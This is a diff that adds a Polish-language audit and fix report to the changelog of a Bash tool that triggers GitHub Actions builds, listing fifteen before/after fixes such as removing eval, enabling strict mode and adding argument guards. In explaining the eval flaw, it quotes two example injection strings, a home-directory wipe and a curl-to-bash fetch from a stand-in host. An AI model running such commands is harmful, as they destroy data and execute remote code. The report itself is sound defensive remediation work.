@@ -9,6 +9,273 @@
 
 ## [3.0.0] — 2026-05-05 · FERRO IRONCLAD
 
+# SCU v3.0 — Audit & Fix Report
+### SecFERRO Division ◈ [FERRO//ANON]
+
+---
+
+## Krytyczne błędy naprawione (było w v2.0)
+
+### 1. `eval` w `_retry()` — Code Injection
+```bash
+# ❌ v2.0 — eval z niezaufanego inputu
+output=$(eval "${cmd[@]}" 2>&1) || exit_code=$?
+
+# ✅ v3.0 — bezpieczne "$@" passing
+output=$("$@" 2>&1) || exit_code=$?
+```
+**Ryzyko:** Każdy string w tablicy `cmd[]` był wykonywany przez `eval` —
+argument zawierający `; rm -rf ~` lub `$(curl evil.sh | bash)` zostałby wykonany.
+Wyeliminowane całkowicie.
+
+---
+
+### 2. `set -Eeuo pipefail` wykomentowany — brak detekcji błędów
+```bash
+# ❌ v2.0
+#set -Eeuo pipefail
+#IFS=$'\n\t'
+
+# ✅ v3.0 — włączony z precyzyjnymi || true gdzie potrzeba
+set -Eeuo pipefail
+IFS=$'\n\t'
+```
+**Skutek v2.0:** Każdy błąd był cicho ignorowany. Skrypt kontynuował po `fatal`
+jeśli `exit 1` nie był w głównym procesie. W v3.0 każde nieobsłużone polecenie
+terminuje skrypt + loguje linię/komendę przez `trap ERR`.
+
+---
+
+### 3. Log rotation — empty glob expansion crash
+```bash
+# ❌ v2.0 — przy braku plików .log: local logs=() → array z literałem "*.log"
+local logs=("$LOG_DIR"/scu_*.log)
+
+# ✅ v3.0 — find z -print0, nullglob-safe
+while IFS= read -r -d '' f; do
+  logs+=("$f")
+done < <(find "$LOG_DIR" -maxdepth 1 -name 'scu_*.log' -print0 | sort -z)
+```
+**Skutek v2.0:** Przy pierwszym uruchomieniu (brak logów) `count=1`
+i skrypt próbował `gzip` na literale `~/.scu/logs/scu_*.log`.
+
+---
+
+### 4. Config parser — wartości z znakiem `=` obcinane
+```bash
+# ❌ v2.0 — IFS='=' read -r key val → WEBHOOK_URL=https://x.com?a=1&b=2 → val="https://x.com?a"
+while IFS='=' read -r key val; do ...
+
+# ✅ v3.0 — rozbicie po PIERWSZYM '=' przez parameter expansion
+local key="${line%%=*}"
+local val="${line#*=}"
+```
+**Skutek v2.0:** Każda wartość zawierająca `=` (URL webhook, JWT token,
+base64 string) była obcinana po pierwszym znaku `=`.
+
+---
+
+### 5. Zduplikowany git-check w `_load_conf()` i `main()`
+```bash
+# ❌ v2.0 — sprawdzenie w _load_conf() PRZED parsowaniem --dry-run
+# Powodowało fatal przy --help i --version (które nie potrzebują Git)
+
+# ✅ v3.0 — jeden check w main(), po _parse_args(), z pomocnym komunikatem
+if ! git rev-parse --is-inside-work-tree &>/dev/null; then
+  echo "..."; echo "  Uruchom: git init && git remote add origin ..."; exit 1
+fi
+```
+
+---
+
+### 6. `_parse_args` — brak guard przed `shift 2` (out-of-bounds)
+```bash
+# ❌ v2.0
+-r|--repo) REPO_NAME="$2"; shift 2 ;;
+# Przy: scu.sh --repo  (bez wartości) → $2 = następna flaga lub crash
+
+# ✅ v3.0
+-r|--repo)
+  (( $# > 1 )) || fatal "--repo wymaga argumentu"
+  REPO_NAME="$2"; shift 2 ;;
+```
+Wszystkie 9 flag przyjmujących argument mają guard `(( $# > 1 ))`.
+
+---
+
+### 7. `--log-level` — brak walidacji wartości
+```bash
+# ❌ v2.0 — LOG_LEVEL="INVALID" powodował błąd w każdym wywołaniu _log_enabled()
+LOG_LEVEL="${2^^}"; shift 2
+
+# ✅ v3.0 — walidacja przez associative array
+LOG_LEVEL="${2^^}"
+[[ -v LOG_LEVELS[$LOG_LEVEL] ]] || fatal "Nieprawidłowy log-level: $LOG_LEVEL"
+```
+
+---
+
+### 8. `_backoff_sleep` — division by zero przy `exp < 5`
+```bash
+# ❌ v2.0
+local jitter=$(( RANDOM % (exp / 5 + 1) ))
+# Przy exp=1: exp/5=0 → RANDOM % 1 = zawsze 0 (ale nieczytelne)
+# Przy exp=0 (możliwe przy base=0): exp/5+1=1 → OK, ale exp=0 powoduje sleep 0
+
+# ✅ v3.0
+(( exp < 1 )) && exp=1
+local jitter=0
+if (( exp >= 5 )); then
+  jitter=$(( RANDOM % (exp / 5) ))
+fi
+```
+
+---
+
+### 9. `_secret_scan` — `xargs` portability (macOS nie ma `-r`)
+```bash
+# ❌ v2.0 — xargs -r nie istnieje na macOS/BSD
+git diff --cached --name-only | xargs -I{} grep -rlP "$pattern" -- {}
+
+# ✅ v3.0 — iteracja po tablicy staged_files[] (null-delimited, bezpieczna)
+while IFS= read -r -d '' f; do staged_files+=("$f"); done \
+  < <(git diff --cached --name-only -z)
+for f in "${staged_files[@]}"; do grep -qP "$pattern" "$f" && hits+=("$f"); done
+```
+
+---
+
+### 10. `_wait_for_run` — `dispatch_time` zapisywany PO `sleep 8`
+```bash
+# ❌ v2.0
+sleep 8
+local dispatch_time; dispatch_time="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+# dispatch_time = 8 sekund PO dispatchu → filtrowało własne runy jako "zbyt stare"
+
+# ✅ v3.0 — dispatch_time przekazywany jako parametr z _run_single_dispatch()
+local dispatch_time="${2:-$(date -u +%Y-%m-%dT%H:%M:%SZ)}"
+# Zapisany PRZED dispathem, sleep 8 po nim
+```
+
+---
+
+### 11. `_generate_report` — `gh run view` na `run_id=N/A`
+```bash
+# ❌ v2.0 — przy SKIP_TRIGGER lub DRY_RUN: run_id="N/A" → gh api call crashował
+conclusion=$(gh run view "$run_id" --json conclusion ...)
+
+# ✅ v3.0 — guard numeryczny
+if [[ "$run_id" =~ ^[0-9]+$ ]]; then
+  conclusion=$(gh run view "$run_id" ...)
+fi
+```
+
+---
+
+### 12. `_trigger_workflow` — `eval` przy dispatch args
+```bash
+# ❌ v2.0 — dispatch_args budowane przez konkatenację string, wykonywane przez eval
+if eval gh workflow run "$WORKFLOW_FILE" --ref "$BRANCH" $payload; then
+
+# ✅ v3.0 — czysta tablica Bash, bez eval
+local -a dispatch_args=(gh workflow run "$WORKFLOW_FILE" --ref "$BRANCH")
+dispatch_args+=(--field "variant=$variant")
+_retry "${dispatch_args[@]}"
+```
+
+---
+
+### 13. `_monitor_execution` — brak `--exit-status` w `gh run watch`
+```bash
+# ❌ v2.0
+gh run watch "$run_id"
+# gh run watch bez --exit-status zawsze zwraca 0 nawet przy failure!
+
+# ✅ v3.0
+gh run watch "$run_id" --exit-status
+# + pełny fallback polling + gh run view --log-failed | tail -150
+```
+
+---
+
+### 14. Multi-run tracking — brak przy build matrix
+```bash
+# ❌ v2.0 — jeden _CURRENT_RUN_ID, matrix gubiła poprzednie run IDs
+_CURRENT_RUN_ID=""
+
+# ✅ v3.0 — tablica _RUN_IDS[]
+declare -a _RUN_IDS=()
+# SIGINT anuluje WSZYSTKIE aktywne runy
+for rid in "${_RUN_IDS[@]}"; do gh run cancel "$rid"; done
+```
+
+---
+
+### 15. Download — brak atomowego zapisu (partial download)
+```bash
+# ❌ v2.0 — pobieranie bezpośrednio do BUILD_OUTPUT_DIR
+gh run download "$run_id" -n "$artifact" -D "$BUILD_OUTPUT_DIR/$artifact"
+# Przy przerwaniu: częściowo pobrane pliki w finalnym miejscu
+
+# ✅ v3.0 — atomic: temp dir → mv do final
+local tmp_dest="${TEMP_DIR}/artifact_${artifact//\//_}"
+gh run download ... -D "$tmp_dest" && mv "$tmp_dest" "$final_dest"
+```
+
+---
+
+## Nowe funkcje v3.0
+
+| Funkcja | Opis |
+|---------|------|
+| `_preflight()` | 10 sprawdzeń: env, bash ver, tools, gh ver, sieć, dysk, HOME, git config, jq, output dir |
+| `_validate_branch()` | Weryfikacja istnienia branch w remote przed dispatch |
+| `--clear-cache` flag | Przekazuje `clear-cache=true` jako workflow input |
+| `--show-reports` flag | Lista ostatnich raportów JSON+TXT |
+| `--retries` validation | Guard `[[ "$2" =~ ^[0-9]+$ ]]` |
+| gh permissions check | `viewerPermission` — ostrzeżenie przy READ-only |
+| Git user/email check | Ostrzeżenie przy nieskonf. git identity |
+| Custom inputs normalizacja | Auto-konwersja non-string values na stringi (jq `tostring`) |
+| `TEMP_DIR` cleanup | `mktemp` + `trap EXIT rm -rf` |
+| Bash 4.0 guard | Exit 1 przy bash < 4 (associative arrays) |
+| `_tee_log()` | Bezpieczny tee — fallback do `cat` gdy LOGFILE niezainicjowany |
+| Workflow YAML v3 | Produkcyjny — identyczny z doc3 (validate+build+notify, SDK 34, NDK 27) |
+
+---
+
+## Kompatybilność
+
+| Środowisko | Status |
+|------------|--------|
+| Termux (Android 7+, bash 5.x) | ✅ Pełna |
+| Ubuntu 22.04+ (bash 5.x) | ✅ Pełna |
+| macOS (bash 5+ przez brew) | ✅ Pełna |
+| Alpine Linux (bash 5+) | ✅ Pełna |
+| bash < 4.0 (macOS system bash 3.2) | ❌ Blocked — komunikat fatal |
+
+---
+
+## Struktura plików
+
+```
+~/.scu/
+├── scu.conf                          ← config INI
+├── logs/
+│   ├── scu_20260505_143012_1234.log  ← aktywne (max 20)
+│   └── scu_20260430_091200_5678.log.gz  ← gzip (stare)
+├── locks/
+│   └── scu.lock                      ← PID (auto-cleanup)
+├── reports/
+│   ├── scu_report_2026-05-05T14:35:00Z.json
+│   └── scu_report_2026-05-05T14:35:00Z.txt
+└── tmp.XXXXXX/                       ← mktemp, czyszczony przez trap
+    └── artifact_neurosync-wearos-apk/  ← staging przed mv
+```
+
+---
+
+*[FERRO//ANON] · SecFERRO Division · SCU v3.0.0 · 2026-05-05*
+
 > Wydanie naprawcze i modernizacyjne. Wszystkie znalezione błędy krytyczne,
 > portabilnościowe i logiczne zostały rozwiązane. Wprowadzono pełny workflow
 > YAML z jobs `validate → build → notify`, pre-flight system oraz cross-platform
